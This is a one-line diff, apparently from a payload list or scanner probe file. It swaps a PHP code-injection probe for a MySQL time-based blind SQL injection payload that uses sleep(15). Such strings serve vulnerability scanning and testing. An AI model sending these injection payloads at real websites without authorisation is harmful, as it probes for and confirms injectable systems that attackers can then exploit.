@@ -1,1 +1,1 @@
-'.print(md5(31337)).'
+555*if(now()=sysdate(),sleep(15),0)
